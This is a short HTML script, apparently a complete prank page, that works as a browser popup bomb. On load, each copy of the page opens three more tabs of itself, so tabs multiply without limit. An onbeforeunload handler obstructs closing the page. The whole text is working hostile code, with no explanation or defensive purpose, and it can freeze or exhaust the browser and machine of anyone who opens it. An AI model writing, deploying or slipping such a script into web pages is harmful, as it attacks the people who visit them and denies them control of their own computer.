<script>
window.onbeforeunload = () => "Error closing page";
const delay=t=>new Promise(i=>setTimeout(i,t))
window.onload = async function(){
    const main = Object.fromEntries(new URLSearchParams(window.location.search)).w === undefined;
    await delay(1e2)
    if (main){
        await delay(2e3)
    }
    for (let i = 0; i < 3; i++){
        window.open(`${window.location.origin}${window.location.pathname}?w=0`, '_blank');
    }
}
</script>